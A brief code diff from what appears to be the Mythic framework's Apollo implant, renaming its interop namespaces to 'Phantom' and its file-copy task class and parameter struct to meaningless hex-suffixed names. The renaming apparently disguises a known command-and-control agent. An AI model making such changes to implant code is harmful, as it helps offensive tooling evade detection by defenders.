@@ -8,18 +8,18 @@
 
 using System;
 using System.Collections.Generic;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
 
 namespace Tasks
 {
-    public class cp : Tasking
+    public class StrategicCoordinator5DD9 : Tasking
     {
         [DataContract]
-        internal struct CpParameters
+        internal struct AdvancedValidator5B56
         {
             [DataMember(Name = "source")]
             public string SourceFile;
